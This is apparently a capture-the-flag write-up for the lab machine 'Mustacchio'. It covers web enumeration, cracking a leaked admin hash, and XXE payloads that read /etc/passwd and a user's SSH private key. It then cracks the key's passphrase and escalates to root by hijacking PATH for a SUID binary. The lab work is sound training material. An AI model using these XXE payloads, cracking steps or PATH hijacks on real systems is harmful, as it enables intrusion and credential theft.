---
layout: default
title: Mustacchio
---

## TL;DR

We find `users.bak` inside `/custom/js` folder and crack admin hash.

Then, we use `XXE` to gain `LFI`, and then get the ssh private key of `barry`, which is encrypted with a password we brute force.

We escalate to root using vulnerable SUID binary, and playing with `PATH` variable.

### Recon

we start with `nmap`, using this command:
```bash
nmap -p- -sVC --min-rate=10000 $target --open -oN nmap.txt -oX nmap.xml
```

![nmap results](image.png)

we can see port `22` with ssh and port `80` with apache http server, and also port `8765` with nginx http server.
```bash
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 58:1b:0c:0f:fa:cf:05:be:4c:c0:7a:f1:f1:88:61:1c (RSA)
|   256 3c:fc:e8:a3:7e:03:9a:30:2c:77:e0:0a:1c:e4:52:e6 (ECDSA)
|_  256 9d:59:c6:c7:79:c5:54:c4:1d:aa:e4:d1:84:71:01:92 (ED25519)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Mustacchio | Home
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/
8765/tcp open  http    nginx 1.10.3 (Ubuntu)
|_http-server-header: nginx/1.10.3 (Ubuntu)
|_http-title: Mustacchio | Login
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
I added `mustacchio` to my `/etc/hosts`.

### Find users.bak in web indexing 

When we access the root page, we get this page:

![root page](image-1.png)

We can also access port `8765`, to check what we can find there, we can see login portal:

![login portal](image-3.png)

Next, I used `ffuf` to enumerate pages on the apache server.

![ffuf results](image-2.png)

As we can see, there are several files or folders available for us.
```bash
┌──(agonen㉿kali)-[~/thm/Mustacchio]
└─$ ffuf -u "http://mustacchio/FUZZ" -w /usr/share/SecLists/Discovery/Web-Content/common.txt 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://mustacchio/FUZZ
 :: Wordlist         : FUZZ: /usr/share/SecLists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.htaccess               [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 84ms]
.htpasswd               [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 3185ms]
.hta                    [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 4192ms]
custom                  [Status: 301, Size: 309, Words: 20, Lines: 10, Duration: 92ms]
fonts                   [Status: 301, Size: 308, Words: 20, Lines: 10, Duration: 93ms]
images                  [Status: 301, Size: 309, Words: 20, Lines: 10, Duration: 86ms]
index.html              [Status: 200, Size: 1752, Words: 77, Lines: 73, Duration: 91ms]
robots.txt              [Status: 200, Size: 28, Words: 3, Lines: 3, Duration: 80ms]
server-status           [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 98ms]
```

Inside `http://mustacchio/custom/js/`, we can find the file `users.bak`, which is very interesting.
Let's download him and analyze it.

![find users.bak](image-4.png)

We can detect this is `sqlite3` format.
```bash
┌──(agonen㉿kali)-[~/thm/Mustacchio]
└─$ file users.bak
users.bak: SQLite 3.x database, last written using SQLite version 3034001, file counter 2, database pages 2, cookie 0x1, schema 4, UTF-8, version-valid-for 2
```

We enter this db, and extract the hashes from `users` table.

![find hashes](image-5.png)

```bash
┌──(agonen㉿kali)-[~/thm/Mustacchio]
└─$ sqlite3 users.bak
SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.
sqlite> .tables
users
sqlite> select * from users;
admin|1868e36a6d2b17d4c2745f1659433a54d4bc5f4b
```

Now, we can trying brute force this hash:
```bash
admin|1868e36a6d2b17d4c2745f1659433a54d4bc5f4b
```

Using `john`, I cracked this easily

![john crack admin hash](image-6.png)

```bash
┌──(agonen㉿kali)-[~/thm/Mustacchio]
└─$ john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA1 [SHA1 256/256 AVX2 8x])
No password hashes left to crack (see FAQ)
                                                                                                                                                 
┌──(agonen㉿kali)-[~/thm/Mustacchio]
└─$ john hashes.txt --show                                     
?:bulldog19

1 password hash cracked, 0 left
```

So, the admin password is `bulldog19`.

Now, we can login to the portal with these credentials:
```bash
admin:bulldog19
```

![success login](image-7.png)

### LFI using XXE to get ssh private key and login as barry

Inside the source code I've found 2 interesting notes

![source code admin panel](image-8.png)

The first note is to check `/auth/dontforget.bak`, there we can find this xml:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>
  <com>his paragraph was a waste of time and space. If you had not read this and I had not typed this you and I couldâ€™ve done something more productive than reading this mindlessly and carelessly as if you did not have anything else to do in life. Life is so precious because it is short and you are being so careless that you do not realize it until now since this void paragraph mentions that you are doing something so mindless, so stupid, so careless that you realize that you are not using your time wisely. You couldâ€™ve been playing with your dog, or eating your cat, but no. You want to read this barren paragraph and expect something marvelous and terrific at the end. But since you still do not realize that you are wasting precious time, you still continue to read the null paragraph. If you had not noticed, you have wasted an estimated time of 20 seconds.</com>
</comment>
```

The second note is this. It might be useful later:
```bash
Barry, you can now SSH in using your key!
```

Now, let's try to give the example in the admin panel, we can see it gives us some preview of the comment:

![comment preview](image-9.png)

I though about XXE Injection, and used payloads from here [https://swisskyrepo.github.io/PayloadsAllTheThings/XXE%20Injection/#exploiting-xxe-to-retrieve-files](https://swisskyrepo.github.io/PayloadsAllTheThings/XXE%20Injection/#exploiting-xxe-to-retrieve-files).

For example, let's try to retrieve `/etc/passwd` inside the name element, using `XXE`, with this payload:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]>
<comment>
  <name>&test;</name>
  <author>Barry Clad</author>
  <com>his paragraph was a waste of time and space. If you had not read this and I had not typed this you and I couldâ€™ve done something more productive than reading this mindlessly and carelessly as if you did not have anything else to do in life. Life is so precious because it is short and you are being so careless that you do not realize it until now since this void paragraph mentions that you are doing something so mindless, so stupid, so careless that you realize that you are not using your time wisely. You couldâ€™ve been playing with your dog, or eating your cat, but no. You want to read this barren paragraph and expect something marvelous and terrific at the end. But since you still do not realize that you are wasting precious time, you still continue to read the null paragraph. If you had not noticed, you have wasted an estimated time of 20 seconds.</com>
</comment>
```

![get /etc/passwd](image-10.png)

This is the what we get:
```bash
Name: root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false syslog:x:104:108::/home/syslog:/bin/false _apt:x:105:65534::/nonexistent:/bin/false lxd:x:106:65534::/var/lib/lxd/:/bin/false messagebus:x:107:111::/var/run/dbus:/bin/false uuidd:x:108:112::/run/uuidd:/bin/false dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin pollinate:x:111:1::/var/cache/pollinate:/bin/false joe:x:1002:1002::/home/joe:/bin/bash barry:x:1003:1003::/home/barry:/bin/bash
```

We can see the user `joe` and the user `barry`. Remember the note, maybe `barry` has some private key, like `id_rsa`, inside `/home/barry/.ssh/id_rsa`.
Let's use this payload:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///home/barry/.ssh/id_rsa'>]>
<comment>
  <name>&test;</name>
  <author>Barry Clad</author>
  <com>his paragraph was a waste of time and space. If you had not read this and I had not typed this you and I couldâ€™ve done something more productive than reading this mindlessly and carelessly as if you did not have anything else to do in life. Life is so precious because it is short and you are being so careless that you do not realize it until now since this void paragraph mentions that you are doing something so mindless, so stupid, so careless that you realize that you are not using your time wisely. You couldâ€™ve been playing with your dog, or eating your cat, but no. You want to read this barren paragraph and expect something marvelous and terrific at the end. But since you still do not realize that you are wasting precious time, you still continue to read the null paragraph. If you had not noticed, you have wasted an estimated time of 20 seconds.</com>
</comment>
```

![get private key](image-11.png)

We got the private key of `barry`:
```bash
-----BEGIN RSA PRIVATE KEY----- Proc-Type: 4,ENCRYPTED DEK-Info: AES-128-CBC,D137279D69A43E71BB7FCB87FC61D25E jqDJP+blUr+xMlASYB9t4gFyMl9VugHQJAylGZE6J/b1nG57eGYOM8wdZvVMGrfN bNJVZXj6VluZMr9uEX8Y4vC2bt2KCBiFg224B61z4XJoiWQ35G/bXs1ZGxXoNIMU MZdJ7DH1k226qQMtm4q96MZKEQ5ZFa032SohtfDPsoim/7dNapEOujRmw+ruBE65 l2f9wZCfDaEZvxCSyQFDJjBXm07mqfSJ3d59dwhrG9duruu1/alUUvI/jM8bOS2D Wfyf3nkYXWyD4SPCSTKcy4U9YW26LG7KMFLcWcG0D3l6l1DwyeUBZmc8UAuQFH7E NsNswVykkr3gswl2BMTqGz1bw/1gOdCj3Byc1LJ6mRWXfD3HSmWcc/8bHfdvVSgQ ul7A8ROlzvri7/WHlcIA1SfcrFaUj8vfXi53fip9gBbLf6syOo0zDJ4Vvw3ycOie TH6b6mGFexRiSaE/u3r54vZzL0KHgXtapzb4gDl/yQJo3wqD1FfY7AC12eUc9NdC rcvG8XcDg+oBQokDnGVSnGmmvmPxIsVTT3027ykzwei3WVlagMBCOO/ekoYeNWlX bhl1qTtQ6uC1kHjyTHUKNZVB78eDSankoERLyfcda49k/exHZYTmmKKcdjNQ+KNk 4cpvlG9Qp5Fh7uFCDWohE/qELpRKZ4/k6HiA4FS13D59JlvLCKQ6IwOfIRnstYB8 7+YoMkPWHvKjmS/vMX+elcZcvh47KNdNl4kQx65BSTmrUSK8GgGnqIJu2/G1fBk+ T+gWceS51WrxIJuimmjwuFD3S2XZaVXJSdK7ivD3E8KfWjgMx0zXFu4McnCfAWki ahYmead6WiWHtM98G/hQ6K6yPDO7GDh7BZuMgpND/LbS+vpBPRzXotClXH6Q99I7 LIuQCN5hCb8ZHFD06A+F2aZNpg0G7FsyTwTnACtZLZ61GdxhNi+3tjOVDGQkPVUs pkh9gqv5+mdZ6LVEqQ31eW2zdtCUfUu4WSzr+AndHPa2lqt90P+wH2iSd4bMSsxg laXPXdcVJxmwTs+Kl56fRomKD9YdPtD4Uvyr53Ch7CiiJNsFJg4lY2s7WiAlxx9o vpJLGMtpzhg8AXJFVAtwaRAFPxn54y1FITXX6tivk62yDRjPsXfzwbMNsvGFgvQK DZkaeK+bBjXrmuqD4EB9K540RuO6d7kiwKNnTVgTspWlVCebMfLIi76SKtxLVpnF 6aak2iJkMIQ9I0bukDOLXMOAoEamlKJT5g+wZCC5aUI6cZG0Mv0XKbSX2DTmhyUF ckQU/dcZcx9UXoIFhx7DesqroBTR6fEBlqsn7OPlSFj0lAHHCgIsxPawmlvSm3bs 7bdofhlZBjXYdIlZgBAqdq5jBJU8GtFcGyph9cb3f+C3nkmeDZJGRJwxUYeUS9Of 1dVkfWUhH2x9apWRV8pJM/ByDd0kNWa/c//MrGM0+DKkHoAZKfDl3sC0gdRB7kUQ +Z87nFImxw95dxVvoZXZvoMSb7Ovf27AUhUeeU8ctWselKRmPw56+xhObBoAbRIn 7mxN/N5LlosTefJnlhdIhIDTDMsEwjACA+q686+bREd+drajgk6R9eKgSME7geVD -----END RSA PRIVATE KEY-----
```

We'll use this payload, to get the output base64 encoded and then decode the string:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY test SYSTEM 'php://filter/convert.base64-encode/resource=/home/barry/.ssh/id_rsa'>]>
<comment>
  <name>&test;</name>
  <author>Barry Clad</author>
  <com>his paragraph was a waste of time and space. If you had not read this and I had not typed this you and I couldâ€™ve done something more productive than reading this mindlessly and carelessly as if you did not have anything else to do in life. Life is so precious because it is short and you are being so careless that you do not realize it until now since this void paragraph mentions that you are doing something so mindless, so stupid, so careless that you realize that you are not using your time wisely. You couldâ€™ve been playing with your dog, or eating your cat, but no. You want to read this barren paragraph and expect something marvelous and terrific at the end. But since you still do not realize that you are wasting precious time, you still continue to read the null paragraph. If you had not noticed, you have wasted an estimated time of 20 seconds.</com>
</comment>
```

We get back:
```bash
Name: LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQ0KUHJvYy1UeXBlOiA0LEVOQ1JZUFRFRA0KREVLLUluZm86IEFFUy0xMjgtQ0JDLEQxMzcyNzlENjlBNDNFNzFCQjdGQ0I4N0ZDNjFEMjVFDQoNCmpxREpQK2JsVXIreE1sQVNZQjl0NGdGeU1sOVZ1Z0hRSkF5bEdaRTZKL2Ixbkc1N2VHWU9NOHdkWnZWTUdyZk4NCmJOSlZaWGo2Vmx1Wk1yOXVFWDhZNHZDMmJ0MktDQmlGZzIyNEI2MXo0WEpvaVdRMzVHL2JYczFaR3hYb05JTVUNCk1aZEo3REgxazIyNnFRTXRtNHE5Nk1aS0VRNVpGYTAzMlNvaHRmRFBzb2ltLzdkTmFwRU91alJtdytydUJFNjUNCmwyZjl3WkNmRGFFWnZ4Q1N5UUZESmpCWG0wN21xZlNKM2Q1OWR3aHJHOWR1cnV1MS9hbFVVdkkvak04Yk9TMkQNCldmeWYzbmtZWFd5RDRTUENTVEtjeTRVOVlXMjZMRzdLTUZMY1djRzBEM2w2bDFEd3llVUJabWM4VUF1UUZIN0UNCk5zTnN3Vnlra3IzZ3N3bDJCTVRxR3oxYncvMWdPZENqM0J5YzFMSjZtUldYZkQzSFNtV2NjLzhiSGZkdlZTZ1ENCnVsN0E4Uk9senZyaTcvV0hsY0lBMVNmY3JGYVVqOHZmWGk1M2ZpcDlnQmJMZjZzeU9vMHpESjRWdnczeWNPaWUNClRINmI2bUdGZXhSaVNhRS91M3I1NHZaekwwS0hnWHRhcHpiNGdEbC95UUpvM3dxRDFGZlk3QUMxMmVVYzlOZEMNCnJjdkc4WGNEZytvQlFva0RuR1ZTbkdtbXZtUHhJc1ZUVDMwMjd5a3p3ZWkzV1ZsYWdNQkNPTy9la29ZZU5XbFgNCmJobDFxVHRRNnVDMWtIanlUSFVLTlpWQjc4ZURTYW5rb0VSTHlmY2RhNDlrL2V4SFpZVG1tS0tjZGpOUStLTmsNCjRjcHZsRzlRcDVGaDd1RkNEV29oRS9xRUxwUktaNC9rNkhpQTRGUzEzRDU5Smx2TENLUTZJd09mSVJuc3RZQjgNCjcrWW9Na1BXSHZLam1TL3ZNWCtlbGNaY3ZoNDdLTmRObDRrUXg2NUJTVG1yVVNLOEdnR25xSUp1Mi9HMWZCaysNClQrZ1djZVM1MVdyeElKdWltbWp3dUZEM1MyWFphVlhKU2RLN2l2RDNFOEtmV2pnTXgwelhGdTRNY25DZkFXa2kNCmFoWW1lYWQ2V2lXSHRNOThHL2hRNks2eVBETzdHRGg3Qlp1TWdwTkQvTGJTK3ZwQlBSelhvdENsWEg2UTk5STcNCkxJdVFDTjVoQ2I4WkhGRDA2QStGMmFaTnBnMEc3RnN5VHdUbkFDdFpMWjYxR2R4aE5pKzN0ak9WREdRa1BWVXMNCnBraDlncXY1K21kWjZMVkVxUTMxZVcyemR0Q1VmVXU0V1N6citBbmRIUGEybHF0OTBQK3dIMmlTZDRiTVNzeGcNCmxhWFBYZGNWSnhtd1RzK0tsNTZmUm9tS0Q5WWRQdEQ0VXZ5cjUzQ2g3Q2lpSk5zRkpnNGxZMnM3V2lBbHh4OW8NCnZwSkxHTXRwemhnOEFYSkZWQXR3YVJBRlB4bjU0eTFGSVRYWDZ0aXZrNjJ5RFJqUHNYZnp3Yk1Oc3ZHRmd2UUsNCkRaa2FlSytiQmpYcm11cUQ0RUI5SzU0MFJ1TzZkN2tpd0tOblRWZ1RzcFdsVkNlYk1mTElpNzZTS3R4TFZwbkYNCjZhYWsyaUprTUlROUkwYnVrRE9MWE1PQW9FYW1sS0pUNWcrd1pDQzVhVUk2Y1pHME12MFhLYlNYMkRUbWh5VUYNCmNrUVUvZGNaY3g5VVhvSUZoeDdEZXNxcm9CVFI2ZkVCbHFzbjdPUGxTRmowbEFISENnSXN4UGF3bWx2U20zYnMNCjdiZG9maGxaQmpYWWRJbFpnQkFxZHE1akJKVThHdEZjR3lwaDljYjNmK0MzbmttZURaSkdSSnd4VVllVVM5T2YNCjFkVmtmV1VoSDJ4OWFwV1JWOHBKTS9CeURkMGtOV2EvYy8vTXJHTTArREtrSG9BWktmRGwzc0MwZ2RSQjdrVVENCitaODduRklteHc5NWR4VnZvWlhadm9NU2I3T3ZmMjdBVWhVZWVVOGN0V3NlbEtSbVB3NTYreGhPYkJvQWJSSW4NCjdteE4vTjVMbG9zVGVmSm5saGRJaElEVERNc0V3akFDQStxNjg2K2JSRWQrZHJhamdrNlI5ZUtnU01FN2dlVkQNCi0tLS0tRU5EIFJTQSBQUklWQVRFIEtFWS0tLS0t
```

![decode](image-12.png)

Now, let's output this into `id_rsa`, and login as `barry`
```bash
echo 'LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQ0KUHJvYy1UeXBlOiA0LEVOQ1JZUFRFRA0KREVLLUluZm86IEFFUy0xMjgtQ0JDLEQxMzcyNzlENjlBNDNFNzFCQjdGQ0I4N0ZDNjFEMjVFDQoNCmpxREpQK2JsVXIreE1sQVNZQjl0NGdGeU1sOVZ1Z0hRSkF5bEdaRTZKL2Ixbkc1N2VHWU9NOHdkWnZWTUdyZk4NCmJOSlZaWGo2Vmx1Wk1yOXVFWDhZNHZDMmJ0MktDQmlGZzIyNEI2MXo0WEpvaVdRMzVHL2JYczFaR3hYb05JTVUNCk1aZEo3REgxazIyNnFRTXRtNHE5Nk1aS0VRNVpGYTAzMlNvaHRmRFBzb2ltLzdkTmFwRU91alJtdytydUJFNjUNCmwyZjl3WkNmRGFFWnZ4Q1N5UUZESmpCWG0wN21xZlNKM2Q1OWR3aHJHOWR1cnV1MS9hbFVVdkkvak04Yk9TMkQNCldmeWYzbmtZWFd5RDRTUENTVEtjeTRVOVlXMjZMRzdLTUZMY1djRzBEM2w2bDFEd3llVUJabWM4VUF1UUZIN0UNCk5zTnN3Vnlra3IzZ3N3bDJCTVRxR3oxYncvMWdPZENqM0J5YzFMSjZtUldYZkQzSFNtV2NjLzhiSGZkdlZTZ1ENCnVsN0E4Uk9senZyaTcvV0hsY0lBMVNmY3JGYVVqOHZmWGk1M2ZpcDlnQmJMZjZzeU9vMHpESjRWdnczeWNPaWUNClRINmI2bUdGZXhSaVNhRS91M3I1NHZaekwwS0hnWHRhcHpiNGdEbC95UUpvM3dxRDFGZlk3QUMxMmVVYzlOZEMNCnJjdkc4WGNEZytvQlFva0RuR1ZTbkdtbXZtUHhJc1ZUVDMwMjd5a3p3ZWkzV1ZsYWdNQkNPTy9la29ZZU5XbFgNCmJobDFxVHRRNnVDMWtIanlUSFVLTlpWQjc4ZURTYW5rb0VSTHlmY2RhNDlrL2V4SFpZVG1tS0tjZGpOUStLTmsNCjRjcHZsRzlRcDVGaDd1RkNEV29oRS9xRUxwUktaNC9rNkhpQTRGUzEzRDU5Smx2TENLUTZJd09mSVJuc3RZQjgNCjcrWW9Na1BXSHZLam1TL3ZNWCtlbGNaY3ZoNDdLTmRObDRrUXg2NUJTVG1yVVNLOEdnR25xSUp1Mi9HMWZCaysNClQrZ1djZVM1MVdyeElKdWltbWp3dUZEM1MyWFphVlhKU2RLN2l2RDNFOEtmV2pnTXgwelhGdTRNY25DZkFXa2kNCmFoWW1lYWQ2V2lXSHRNOThHL2hRNks2eVBETzdHRGg3Qlp1TWdwTkQvTGJTK3ZwQlBSelhvdENsWEg2UTk5STcNCkxJdVFDTjVoQ2I4WkhGRDA2QStGMmFaTnBnMEc3RnN5VHdUbkFDdFpMWjYxR2R4aE5pKzN0ak9WREdRa1BWVXMNCnBraDlncXY1K21kWjZMVkVxUTMxZVcyemR0Q1VmVXU0V1N6citBbmRIUGEybHF0OTBQK3dIMmlTZDRiTVNzeGcNCmxhWFBYZGNWSnhtd1RzK0tsNTZmUm9tS0Q5WWRQdEQ0VXZ5cjUzQ2g3Q2lpSk5zRkpnNGxZMnM3V2lBbHh4OW8NCnZwSkxHTXRwemhnOEFYSkZWQXR3YVJBRlB4bjU0eTFGSVRYWDZ0aXZrNjJ5RFJqUHNYZnp3Yk1Oc3ZHRmd2UUsNCkRaa2FlSytiQmpYcm11cUQ0RUI5SzU0MFJ1TzZkN2tpd0tOblRWZ1RzcFdsVkNlYk1mTElpNzZTS3R4TFZwbkYNCjZhYWsyaUprTUlROUkwYnVrRE9MWE1PQW9FYW1sS0pUNWcrd1pDQzVhVUk2Y1pHME12MFhLYlNYMkRUbWh5VUYNCmNrUVUvZGNaY3g5VVhvSUZoeDdEZXNxcm9CVFI2ZkVCbHFzbjdPUGxTRmowbEFISENnSXN4UGF3bWx2U20zYnMNCjdiZG9maGxaQmpYWWRJbFpnQkFxZHE1akJKVThHdEZjR3lwaDljYjNmK0MzbmttZURaSkdSSnd4VVllVVM5T2YNCjFkVmtmV1VoSDJ4OWFwV1JWOHBKTS9CeURkMGtOV2EvYy8vTXJHTTArREtrSG9BWktmRGwzc0MwZ2RSQjdrVVENCitaODduRklteHc5NWR4VnZvWlhadm9NU2I3T3ZmMjdBVWhVZWVVOGN0V3NlbEtSbVB3NTYreGhPYkJvQWJSSW4NCjdteE4vTjVMbG9zVGVmSm5saGRJaElEVERNc0V3akFDQStxNjg2K2JSRWQrZHJhamdrNlI5ZUtnU01FN2dlVkQNCi0tLS0tRU5EIFJTQSBQUklWQVRFIEtFWS0tLS0t' | base64 -d > id_rsa
```

Of course, not forget to chmod to 700, private key.

```bash
┌──(agonen㉿kali)-[~/thm/Mustacchio]
└─$ chmod 700 id_rsa
                                                                                                                                                                                             
┌──(agonen㉿kali)-[~/thm/Mustacchio]
└─$ ssh barry@mustacchio -i id_rsa
Enter passphrase for key 'id_rsa': 
barry@mustacchio: Permission denied (publickey).
```

As we can see, it asks for passphrase.

![asking for passphrase](image-13.png)

Using `ssh2john` and the `john`, we can crack the hash.

```bash
┌──(agonen㉿kali)-[~/thm/Mustacchio]
└─$ ssh2john id_rsa > hashes.txt  
                                                                                                                                                                                             
┌──(agonen㉿kali)-[~/thm/Mustacchio]
└─$ john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
No password hashes left to crack (see FAQ)
                                                                                                                                                                                             
┌──(agonen㉿kali)-[~/thm/Mustacchio]
└─$ john hashes.txt --show                                     
id_rsa:urieljames

1 password hash cracked, 0 left
```

![crack hash](image-14.png)

Now, we can login with the passphrase `urieljames`.

![success login](image-15.png)

And reading `user.txt`:
```bash
barry@mustacchio:~$ cat user.txt 
62d77a4d5f97d47c5aa38b3b2651b831
```

![user.txt](image-16.png)

### Privilege Escalation to Root using live_log SUID binary

Next, we can find inside `joe`'s home folder, the SUID binary `live_log`.

![find live_log](image-17.png)

I used the util `strings` and find out the string `tail -f /var/log/nginx/access.log` inside.
```bash
barry@mustacchio:~$ strings /home/joe/live_log 
/lib64/ld-linux-x86-64.so.2
libc.so.6
setuid
printf
system
__cxa_finalize
setgid
__libc_start_main
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
u+UH
[]A\A]A^A_
Live Nginx Log Reader
tail -f /var/log/nginx/access.log
:*3$"
....
```

It probably uses `tail` inside its execution, I can verify this using execution with `ltrace`, and see it fails when not having enough permissions for reading `/var/log/nginx/access.log`.

![not enough permissions](image-18.png)

So, we can create our own `tail` and change the `PATH` env variable, and then escalate to root.

![get root flag](image-19.png)
```bash
barry@mustacchio:~$ echo -e '#!/bin/bash\ncat /root/root.txt' > /tmp/tail
barry@mustacchio:~$ chmod +x /tmp/tail
barry@mustacchio:~$ export PATH=/tmp:$PATH
barry@mustacchio:~$ /home/joe/live_log 
3223581420d906c4dd1a5f9b530393a5
Live Nginx Log Reader
```

So, the root flag is:
```bash
3223581420d906c4dd1a5f9b530393a5
```


